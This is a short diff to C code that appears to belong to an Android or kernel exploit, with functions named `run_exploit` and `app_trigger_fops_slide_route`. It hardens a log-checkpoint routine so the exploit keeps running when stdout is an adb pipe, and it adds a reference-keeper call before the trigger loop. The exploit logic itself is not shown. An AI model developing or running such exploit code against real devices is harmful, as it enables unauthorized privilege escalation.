@@ -25,13 +25,17 @@ static void durable_log_checkpoint(const char *stage) {
   struct stat st;
   pr_info("durable log checkpoint stage=%s\n", stage);
   SYSCHK(fflush(NULL));
-  SYSCHK(fstat(STDOUT_FILENO, &st));
-  if (!S_ISREG(st.st_mode)) {
-    pr_warning("durable log checkpoint skipped stage=%s mode=%#o\n",
-               stage, st.st_mode);
+  if (fstat(STDOUT_FILENO, &st) != 0 ||
+      !S_ISREG(st.st_mode)) {
+    /* stdout may be a pipe (adb shell) or closed; fsync would fail with
+     * EINVAL/EBADF/ESPIPE — skip instead of aborting mid-choreography. */
+    pr_warning("durable log checkpoint skipped stage=%s\n", stage);
     return;
   }
-  SYSCHK(fsync(STDOUT_FILENO));
+  if (fsync(STDOUT_FILENO) != 0) {
+    pr_warning("durable log checkpoint fsync failed stage=%s errno=%d\n",
+               stage, errno);
+  }
 }
 #endif
 
@@ -833,6 +837,7 @@ int run_exploit(int argc, char **argv) {
             attempt, fops_fresh_page_attempts);
   }
 #else
+  start_p0_ref_keeper();
   for (int attempt = 1; attempt <= 1; attempt++) {
     int triggered = app_trigger_fops_slide_route();
     pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
